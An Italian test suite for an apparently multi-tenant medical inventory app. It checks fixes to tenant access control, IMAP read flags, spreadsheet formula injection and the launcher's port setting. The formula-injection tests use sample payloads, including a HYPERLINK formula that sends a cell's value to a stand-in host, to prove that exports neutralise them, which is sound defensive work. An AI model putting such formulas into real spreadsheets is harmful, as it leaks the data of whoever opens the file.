"""A02, A06, M09, M15: i quattro difetti dell'audit senza una casa naturale
in un file di test esistente.

A02 — operazione_globale_required copre backup, ripristino, reset e
configurazione globale. Fino alla 2.8.0 bastava essere 'admin' per aprirle:
l'amministratore di una struttura poteva scaricare il database di tutti i
tenant. Ora passa solo il superadmin, con l'eccezione dell'installazione a
struttura singola, dove un superadmin non esiste e "globale" coincide con
"la mia struttura".

A06 — la posta veniva letta con FETCH RFC822, che segna \\Seen da solo: un
errore durante l'elaborazione bruciava il verbale, perche' la ricerca
successiva e' su UNSEEN e il messaggio non era piu' tale. Ora si legge con
BODY.PEEK[], un FETCH fallito solleva, e il flag lo mette il chiamante solo
dopo un giro andato a buon fine.

M09 — i fogli Excel esportati riportano testo scritto dagli utenti. Excel e
LibreOffice eseguono il contenuto di una cella che inizia per = + - @: la
descrizione di un apparecchio poteva diventare codice sul computer di chi
apriva il report.

M15 — il launcher leggeva solo config.json, ma dalla 2.6 'port' sta in
config.local.json: apriva sempre la 5000 anche su un'installazione
configurata altrove.
"""
import importlib.util
import json
import os

import pytest
from werkzeug.security import generate_password_hash


# ---------------------------------------------------------------------------
# A02 — operazioni globali
# ---------------------------------------------------------------------------

def entra(client, email):
    client.post('/login', data={'email': email, 'password': 'Passw0rd!'})


@pytest.fixture
def due_strutture(app):
    """Due strutture, un admin della prima e un superadmin.

    Due strutture sono il minimo perche' "globale" e "la mia struttura" non
    coincidano piu': con una sola l'admin conserva l'accesso di proposito.
    """
    from models import execute
    with app.app_context():
        pw = generate_password_hash('Passw0rd!')
        prima = execute("INSERT INTO strutture (nome,codice,attiva) VALUES ('Clinica G','GG',1)").lastrowid
        execute("INSERT INTO strutture (nome,codice,attiva) VALUES ('Clinica H','HH',1)")
        execute("INSERT INTO divisioni (nome,codice,struttura_id) VALUES ('Div G','DVG',?)", (prima,))
        execute(
            "INSERT INTO utenti (email,password_hash,nome,cognome,ruolo,struttura_id,primo_accesso) "
            "VALUES ('anna@g.it',?,'Anna','G','admin',?,0)", (pw, prima))
        execute(
            "INSERT INTO utenti (email,password_hash,nome,cognome,ruolo,struttura_id,primo_accesso) "
            "VALUES ('super@g.it',?,'Super','G','superadmin',NULL,0)", (pw,))
    return {'struttura': prima}


def test_l_admin_di_una_struttura_non_apre_la_configurazione_globale(client, due_strutture):
    """La pagina contiene le chiavi AI e le credenziali IMAP/SMTP di tutto il
    deployment: non e' roba di una struttura."""
    entra(client, 'anna@g.it')
    risposta = client.get('/admin/configurazione')
    assert risposta.status_code == 302
    seguito = client.get('/admin/configurazione', follow_redirects=True)
    assert 'riservata al superamministratore' in seguito.get_data(as_text=True)


def test_l_admin_di_una_struttura_non_scarica_il_backup(client, due_strutture):
    """Il backup e' un file solo per tutti i tenant: darlo a un admin di
    struttura e' consegnargli i dati degli altri."""
    entra(client, 'anna@g.it')
    assert client.get('/admin/backup').status_code == 302


def test_il_superadmin_apre_la_configurazione_globale(client, due_strutture):
    entra(client, 'super@g.it')
    assert client.get('/admin/configurazione').status_code == 200


def test_a_struttura_singola_l_admin_conserva_l_accesso(client, app, due_strutture):
    """Nelle installazioni a struttura singola seed.py non crea nessun
    superadmin: se l'admin perdesse queste pagine, il backup non lo potrebbe
    piu' fare nessuno."""
    app.config['APP_CONFIG']['single_struttura'] = True
    try:
        entra(client, 'anna@g.it')
        assert client.get('/admin/configurazione').status_code == 200
    finally:
        app.config['APP_CONFIG']['single_struttura'] = False


def test_disattivare_le_altre_strutture_non_da_i_poteri_globali(client, app, due_strutture):
    """Le strutture si contano tutte, anche le disattivate: i loro dati
    restano nel database e il backup li porta via lo stesso."""
    from models import execute
    with app.app_context():
        execute("UPDATE strutture SET attiva = 0 WHERE codice = 'HH'")
    entra(client, 'anna@g.it')
    assert client.get('/admin/configurazione').status_code == 302


# ---------------------------------------------------------------------------
# A06 — FETCH che non tocca il flag di lettura
# ---------------------------------------------------------------------------

class CasellaFinta:
    """Sostituto della connessione IMAP: registra cosa le viene chiesto."""

    def __init__(self, stato='OK', dati=None):
        self.stato = stato
        self.dati = dati
        self.fetch_richiesti = []
        self.store_chiamate = []

    def fetch(self, msg_id, parti):
        self.fetch_richiesti.append(parti)
        return self.stato, self.dati

    def store(self, msg_id, comando, flag):
        self.store_chiamate.append((msg_id, comando, flag))
        return 'OK', [b'']


def _processa(casella):
    import email_monitor
    return email_monitor._process_email(
        casella, b'1', 1, 'chiave', 'modello', '/tmp/x', '/tmp/x.sqlite', {},
        app_config={'single_struttura': False}, struttura_id=1)


def test_l_email_si_legge_senza_segnarla_letta():
    """BODY.PEEK[] al posto di RFC822: e' la sola differenza fra un verbale
    ritentato al giro dopo e un verbale perso."""
    casella = CasellaFinta(stato='NO', dati=None)
    with pytest.raises(RuntimeError):
        _processa(casella)
    assert casella.fetch_richiesti == ['(BODY.PEEK[])']
    assert casella.store_chiamate == []


def test_un_fetch_fallito_solleva():
    """Un return silenzioso lasciava proseguire il chiamante, che subito dopo
    segnava il messaggio come letto."""
    casella = CasellaFinta(stato='NO', dati=None)
    with pytest.raises(RuntimeError) as errore:
        _processa(casella)
    assert 'FETCH non riuscito' in str(errore.value)


@pytest.mark.parametrize('dati', [None, [], [None], [(b'1 (BODY[] {1})',)]])
def test_una_risposta_fetch_incompleta_solleva(dati):
    """Il server puo' rispondere OK e non consegnare il corpo: senza questo
    controllo si finiva su un IndexError dentro il try del chiamante, con lo
    stesso effetto di prima."""
    casella = CasellaFinta(stato='OK', dati=dati)
    with pytest.raises(RuntimeError) as errore:
        _processa(casella)
    assert 'incompleta' in str(errore.value)


def test_segna_letta_mette_il_flag():
    """Il flag lo mette il chiamante, dopo che _process_email e' tornato senza
    eccezioni."""
    import email_monitor
    casella = CasellaFinta()
    email_monitor._segna_letta(casella, b'1', 'posta@g.it')
    assert casella.store_chiamate == [(b'1', '+FLAGS', r'\Seen')]


def test_segna_letta_non_esplode_se_il_server_rifiuta():
    """Gira dentro il thread dello scheduler: un'eccezione qui non la
    vedrebbe nessuno e fermerebbe il resto della casella."""
    import email_monitor

    class Rifiuta(CasellaFinta):
        def store(self, *args):
            raise OSError('connessione persa')

    email_monitor._segna_letta(Rifiuta(), b'1', 'posta@g.it')


# ---------------------------------------------------------------------------
# M09 — formule nei fogli esportati
# ---------------------------------------------------------------------------

@pytest.mark.parametrize('valore', ['=1+1', '+1', '-1', '@SUM(A1)', chr(9) + '=1+1', chr(13) + '=1+1'])
def test_una_cella_che_inizia_per_formula_viene_forzata_a_testo(valore):
    from export_service import cella_sicura
    assert cella_sicura(valore) == "'" + valore


@pytest.mark.parametrize('valore', ['Siemens', '', None, 3, 3.5, 'a=b'])
def test_il_testo_normale_e_i_numeri_passano_intatti(valore):
    """L'apostrofo davanti a un numero lo trasformerebbe in testo e
    romperebbe i totali del foglio."""
    from export_service import cella_sicura
    assert cella_sicura(valore) == valore


def test_l_export_degli_apparecchi_non_scrive_formule():
    """Il caso reale: la descrizione la scrive l'utente, il foglio lo apre
    qualcun altro."""
    from openpyxl import load_workbook
    from export_service import export_apparecchi_excel

    cattivo = '=HYPERLINK("http://x/?p="&A1,"clicca")'
    buffer = export_apparecchi_excel([{
        'matricola': 'MAT-9',
        'descrizione': cattivo,
        'marca': 'Acme',
        'modello': 'X1',
    }])
    foglio = load_workbook(buffer).active
    assert foglio.cell(row=5, column=2).value == "'" + cattivo
    assert foglio.cell(row=5, column=1).value == 'MAT-9'


# ---------------------------------------------------------------------------
# M15 — la porta del launcher
# ---------------------------------------------------------------------------

def _carica_launcher():
    """launcher.pyw non e' importabile per nome: l'estensione .pyw non sta fra
    quelle che import riconosce."""
    radice = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    spec = importlib.util.spec_from_loader(
        'launcher_test',
        importlib.machinery.SourceFileLoader('launcher_test', os.path.join(radice, 'launcher.pyw'))
    )
    modulo = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(modulo)
    return modulo


def _scrivi(percorso, dati):
    with open(percorso, 'w', encoding='utf-8') as f:
        json.dump(dati, f)


def test_il_launcher_legge_la_porta_da_config_local(tmp_path, monkeypatch):
    """Prima leggeva solo config.json, dove 'port' non c'e' mai: apriva la
    5000 mentre il server ascoltava altrove."""
    modulo = _carica_launcher()
    _scrivi(tmp_path / 'config.json', {'version': '2.8.0'})
    _scrivi(tmp_path / 'config.local.json', {'port': 8080, 'app_name': 'MedInventory Ospedale'})
    monkeypatch.setattr(modulo, 'CONFIG_PATH', str(tmp_path / 'config.json'))
    monkeypatch.setattr(modulo, 'LOCAL_CONFIG_PATH', str(tmp_path / 'config.local.json'))

    launcher = modulo.MedInventoryLauncher()
    assert launcher._port == 8080
    assert launcher._server_url == 'http://localhost:8080'
    assert launcher._app_name == 'MedInventory Ospedale'


def test_la_configurazione_locale_vince_su_quella_di_sistema(tmp_path, monkeypatch):
    modulo = _carica_launcher()
    _scrivi(tmp_path / 'config.json', {'port': 5000, 'app_name': 'MedInventory'})
    _scrivi(tmp_path / 'config.local.json', {'port': 9001})
    monkeypatch.setattr(modulo, 'CONFIG_PATH', str(tmp_path / 'config.json'))
    monkeypatch.setattr(modulo, 'LOCAL_CONFIG_PATH', str(tmp_path / 'config.local.json'))

    assert modulo._load_config()['port'] == 9001


def test_senza_configurazione_il_launcher_resta_sulla_5000(tmp_path, monkeypatch):
    """Un file mancante o illeggibile non deve impedire l'avvio."""
    modulo = _carica_launcher()
    monkeypatch.setattr(modulo, 'CONFIG_PATH', str(tmp_path / 'assente.json'))
    monkeypatch.setattr(modulo, 'LOCAL_CONFIG_PATH', str(tmp_path / 'assente.local.json'))

    assert modulo.MedInventoryLauncher()._port == 5000
